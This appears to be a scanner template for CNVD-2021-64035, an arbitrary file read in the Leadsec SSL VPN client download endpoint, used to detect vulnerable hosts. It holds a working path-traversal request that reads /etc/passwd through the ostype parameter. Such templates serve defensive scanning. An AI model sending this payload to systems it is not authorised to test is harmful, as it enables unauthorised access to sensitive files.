id: CNVD-2021-64035
brief:
    title: Leadsec VPN - Arbitrary File Read
    by: xiaoWangSec
    level: high
    about: There is an information leakage vulnerability in the SSL VPN of Beijing Wangyuxingyun Information Technology Co., Ltd., and attackers can use the vulnerability to obtain sensitive information.
    label:
        - cnvd
        - cnvd2024
        - lfi
        - leadsec
        - vpn
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd'
      signs:
        - "on": word
          has:
            - appframe
          in: header
          need: all
        - "on": status
          status:
            - 200
